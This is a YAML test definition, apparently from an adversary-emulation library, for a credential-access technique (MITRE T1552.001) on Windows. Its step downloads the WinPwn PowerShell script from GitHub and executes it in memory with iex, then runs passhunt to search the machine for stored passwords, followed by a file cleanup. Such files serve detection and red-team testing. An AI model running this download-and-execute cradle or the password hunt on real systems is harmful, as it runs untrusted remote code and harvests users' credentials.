api_version: "2.0"
name: WinPwn - passhunt
description: Search for Passwords on this system using passhunt via WinPwn
uuid: 00e3e3c7-6c3c-455e-bd4b-461c7f0e7797
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1552: Unsecured Credentials'
    subtechniques:
        - 'T1552.001: Credentials In Files'
requirements:
    platforms:
        - os: windows
steps:
    - name: winpwn---passhunt
      inline: |-
        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        passhunt -local $true -noninteractive
      executor: powershell
      cleanup:
        inline: |-
            rm -force .\passhunt.exe -ErrorAction Ignore
            rm -force .\phunter* -ErrorAction Ignore
            rm -force -recurse .\DomainRecon -ErrorAction Ignore
            rm -force -recurse .\Exploitation -ErrorAction Ignore
            rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
            rm -force -recurse .\LocalRecon -ErrorAction Ignore
            rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
        executor: powershell
